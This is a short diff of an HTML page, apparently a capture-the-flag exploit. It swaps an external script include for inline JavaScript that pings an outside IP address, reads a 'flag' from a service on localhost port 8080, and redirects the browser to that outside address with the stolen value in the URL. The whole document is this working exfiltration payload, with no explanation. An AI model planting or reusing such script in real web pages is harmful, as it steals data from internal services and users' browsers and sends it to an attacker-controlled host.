@@ -1,2 +1,7 @@
      <!doctype html>
-     <script src="https://gsbp0.github.io/x.js"></script>
+     <script>fetch('http://111.229.198.6/succ')</script>
+     <script>fetch('http://127.0.0.1:8080/flag')
+       .then(r => r.text())
+       .then(flag => {
+         location = 'http://111.229.198.6/leak?flag=' + encodeURIComponent(flag)
+       })</script>
